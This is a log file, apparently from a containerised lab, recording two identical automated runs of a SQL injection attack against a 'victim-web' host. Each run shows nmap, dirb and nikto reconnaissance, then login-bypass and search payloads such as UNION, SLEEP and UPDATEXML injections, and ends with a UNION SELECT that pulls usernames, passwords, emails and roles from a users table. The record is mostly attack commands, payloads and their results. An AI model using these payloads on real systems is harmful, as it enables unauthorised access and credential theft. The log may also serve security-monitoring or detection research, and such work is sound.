2025-07-22 11:07:36,614 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-22 11:07:36,614 - INFO - Container ID: attacker
2025-07-22 11:07:36,614 - INFO - Target: http://victim-web:80
2025-07-22 11:07:36,614 - INFO - Attack Type: sql_injection
2025-07-22 11:07:36,614 - INFO - ============================================================
2025-07-22 11:07:36,615 - INFO - === Testing Container Connectivity ===
2025-07-22 11:07:36,619 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-22 11:07:36,619 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-22 11:07:36,619 - INFO - === Network Reconnaissance Phase ===
2025-07-22 11:07:36,619 - INFO - Running: nmap -sS -p- victim-web
2025-07-22 11:07:37,565 - INFO - [+] Nmap scan completed with return code: 0
2025-07-22 11:07:42,569 - INFO - === Web Application Enumeration Phase ===
2025-07-22 11:07:42,570 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-22 11:07:43,658 - INFO - [+] Dirb scan completed with return code: 0
2025-07-22 11:07:43,658 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-22 11:08:22,872 - INFO - [+] Nikto scan completed with return code: 0
2025-07-22 11:08:27,874 - INFO - === Custom SQL Injection Phase ===
2025-07-22 11:08:27,875 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-22 11:08:27,903 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:08:30,330 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-22 11:08:30,348 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:08:31,778 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-22 11:08:31,790 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:08:33,293 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-22 11:08:33,295 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-22 11:08:34,914 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-22 11:08:34,916 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:08:36,320 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-22 11:08:36,323 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-22 11:08:38,805 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-22 11:08:38,808 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:08:41,613 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-22 11:08:41,615 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:08:43,472 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-22 11:08:43,475 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:08:46,005 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-22 11:08:46,007 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:08:48,293 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-22 11:08:48,305 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:08:54,834 - INFO - === Data Extraction Phase ===
2025-07-22 11:08:54,849 - INFO -     Found 1 columns in search query
2025-07-22 11:08:54,850 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-22 11:08:54,859 - INFO -     Status: 200, Success: True
2025-07-22 11:08:54,881 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-22 11:08:54,884 - INFO -     Found user: admin
2025-07-22 11:08:55,886 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-22 11:08:55,894 - INFO -     Found user: alice
2025-07-22 11:08:56,896 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-22 11:08:56,911 - INFO -     Found user: bob
2025-07-22 11:08:57,915 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-22 11:08:57,927 - INFO -     Found user: guest
2025-07-22 11:08:58,929 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-22 11:08:58,941 - INFO -     Found user: john
2025-07-22 11:08:59,945 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-22 11:08:59,975 - INFO -     Found user: manager
2025-07-22 11:09:00,977 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-22 11:09:00,979 - INFO -     Found user: test
2025-07-22 11:09:01,981 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-22 11:09:01,983 - INFO -     Found user: user1
2025-07-22 11:09:02,985 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-22 11:09:02,987 - INFO -     Found user: user1
2025-07-22 11:09:03,989 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-22 11:09:04,007 - INFO -     Found user: test
2025-07-22 11:09:05,015 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-22 11:09:05,037 - INFO - [+] Data extraction completed, saved to /opt/output/extracted_data.html
2025-07-22 11:09:05,038 - INFO - === Saving Attack Results ===
2025-07-22 11:09:05,040 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-22 11:09:05,041 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-22 11:09:05,041 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-22 11:09:05,042 - INFO - [+] Attack summary saved to /opt/output/attack_summary.txt
2025-07-22 11:09:05,042 - INFO - 
[ATTACK_END] 2025-07-22T11:09:05.038951
2025-07-22 11:09:05,042 - INFO - 
✅ Enhanced container attack completed!
2025-07-22 11:09:05,043 - INFO - Check the following for attack data:
2025-07-22 11:09:05,043 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-22 11:09:05,043 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-22 11:09:05,043 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-22 11:09:05,043 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-22 11:09:05,043 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-22 11:09:05,043 - INFO - - Extracted data: /opt/output/extracted_data.html
2025-07-22 11:11:58,091 - INFO - 🚀 Starting Enhanced Container-based SQL Injection Attack
2025-07-22 11:11:58,091 - INFO - Container ID: attacker
2025-07-22 11:11:58,091 - INFO - Target: http://victim-web:80
2025-07-22 11:11:58,091 - INFO - Attack Type: sql_injection
2025-07-22 11:11:58,091 - INFO - ============================================================
2025-07-22 11:11:58,092 - INFO - === Testing Container Connectivity ===
2025-07-22 11:11:58,095 - INFO - [+] Successfully connected to http://victim-web:80
2025-07-22 11:11:58,095 - INFO - [CONTAINER] connectivity_test: {'status': 'success', 'status_code': 200}
2025-07-22 11:11:58,095 - INFO - === Network Reconnaissance Phase ===
2025-07-22 11:11:58,095 - INFO - Running: nmap -sS -p- victim-web
2025-07-22 11:11:58,824 - INFO - [+] Nmap scan completed with return code: 0
2025-07-22 11:12:03,826 - INFO - === Web Application Enumeration Phase ===
2025-07-22 11:12:03,829 - INFO - Running: dirb http://victim-web:80 /usr/share/dirb/wordlists/common.txt -S -r
2025-07-22 11:12:04,955 - INFO - [+] Dirb scan completed with return code: 0
2025-07-22 11:12:04,956 - INFO - Running: nikto -h http://victim-web:80 -Format txt -o /opt/output/nikto_results.txt
2025-07-22 11:12:12,648 - INFO - [+] Nikto scan completed with return code: 0
2025-07-22 11:12:17,665 - INFO - === Custom SQL Injection Phase ===
2025-07-22 11:12:17,666 - INFO - [+] Custom Login Attack 1: admin' --
2025-07-22 11:12:17,675 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:12:20,444 - INFO - [+] Custom Login Attack 2: admin' OR '1'='1
2025-07-22 11:12:20,464 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:12:21,966 - INFO - [+] Custom Login Attack 3: ' OR 1=1--
2025-07-22 11:12:21,972 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:12:24,128 - INFO - [+] Custom Login Attack 4: ' UNION SELECT 1,2,3--
2025-07-22 11:12:24,144 - INFO -     Status: 200, SQL Error: True, Success: False
2025-07-22 11:12:25,928 - INFO - [+] Custom Login Attack 5: admin'/*
2025-07-22 11:12:25,943 - INFO -     Status: 200, SQL Error: False, Success: True
2025-07-22 11:12:27,760 - INFO - [+] Custom Login Attack 6: ' OR 'x'='x
2025-07-22 11:12:27,767 - INFO -     Status: 200, SQL Error: False, Success: False
2025-07-22 11:12:28,788 - INFO - [+] Custom Search Attack 1: ' OR 1=1--
2025-07-22 11:12:28,790 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:12:30,892 - INFO - [+] Custom Search Attack 2: ' UNION SELECT 1,2,3,4,5--
2025-07-22 11:12:30,904 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:12:33,251 - INFO - [+] Custom Search Attack 3: ' AND (SELECT COUNT(*) FROM users)>0--
2025-07-22 11:12:33,265 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:12:34,347 - INFO - [+] Custom Search Attack 4: ' AND (SELECT SLEEP(3))--
2025-07-22 11:12:34,367 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:12:35,396 - INFO - [+] Custom Search Attack 5: ' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--
2025-07-22 11:12:35,399 - INFO -     Status: 200, SQL Error: False, Time-based: False
2025-07-22 11:12:43,328 - INFO - === Data Extraction Phase ===
2025-07-22 11:12:43,333 - INFO -     Found 1 columns in search query
2025-07-22 11:12:43,333 - INFO - Attempting data extraction (Method 1): ' UNION SELECT 1,username,password,email,role FROM users--
2025-07-22 11:12:43,336 - INFO -     Status: 200, Success: True
2025-07-22 11:12:43,354 - INFO - Attempting data extraction (Method 2.1): OFFSET 0
2025-07-22 11:12:43,357 - INFO -     Found user: admin
2025-07-22 11:12:44,361 - INFO - Attempting data extraction (Method 2.2): OFFSET 1
2025-07-22 11:12:44,371 - INFO -     Found user: alice
2025-07-22 11:12:45,374 - INFO - Attempting data extraction (Method 2.3): OFFSET 2
2025-07-22 11:12:45,382 - INFO -     Found user: bob
2025-07-22 11:12:46,387 - INFO - Attempting data extraction (Method 2.4): OFFSET 3
2025-07-22 11:12:46,400 - INFO -     Found user: guest
2025-07-22 11:12:47,401 - INFO - Attempting data extraction (Method 2.5): OFFSET 4
2025-07-22 11:12:47,404 - INFO -     Found user: john
2025-07-22 11:12:48,406 - INFO - Attempting data extraction (Method 2.6): OFFSET 5
2025-07-22 11:12:48,409 - INFO -     Found user: manager
2025-07-22 11:12:49,410 - INFO - Attempting data extraction (Method 2.7): OFFSET 6
2025-07-22 11:12:49,412 - INFO -     Found user: test
2025-07-22 11:12:50,413 - INFO - Attempting data extraction (Method 2.8): OFFSET 7
2025-07-22 11:12:50,416 - INFO -     Found user: user1
2025-07-22 11:12:51,418 - INFO - Attempting data extraction (Method 2.9): OFFSET 8
2025-07-22 11:12:51,428 - INFO -     Found user: user1
2025-07-22 11:12:52,431 - INFO - Attempting data extraction (Method 2.10): OFFSET 9
2025-07-22 11:12:52,446 - INFO -     Found user: test
2025-07-22 11:12:53,451 - INFO - [+] Extracted 10 users, saved to /opt/output/extracted_data.html
2025-07-22 11:12:53,452 - INFO - [+] Data extraction completed, saved to /opt/output/extracted_data.html
2025-07-22 11:12:53,452 - INFO - === Saving Attack Results ===
2025-07-22 11:12:53,456 - INFO - [+] Scan results saved to /opt/output/scan_results.json
2025-07-22 11:12:53,458 - INFO - [+] SQL injection results saved to /opt/output/sql_injection_results.json
2025-07-22 11:12:53,461 - INFO - [+] Container attack log saved to /opt/output/container_attack_log.json
2025-07-22 11:12:53,462 - INFO - [+] Detailed attack summary saved to /opt/output/attack_summary.txt
2025-07-22 11:12:53,462 - INFO - 
[ATTACK_END] 2025-07-22T11:12:53.452663
2025-07-22 11:12:53,462 - INFO - 
✅ Enhanced container attack completed!
2025-07-22 11:12:53,462 - INFO - Check the following for attack data:
2025-07-22 11:12:53,462 - INFO - - Container logs: docker logs securitylogs-attacker
2025-07-22 11:12:53,462 - INFO - - Attack log: /opt/output/container_attack_log.json
2025-07-22 11:12:53,462 - INFO - - Scan results: /opt/output/scan_results.json
2025-07-22 11:12:53,464 - INFO - - SQL injection results: /opt/output/sql_injection_results.json
2025-07-22 11:12:53,464 - INFO - - Attack summary: /opt/output/attack_summary.txt
2025-07-22 11:12:53,464 - INFO - - Extracted data: /opt/output/extracted_data.html
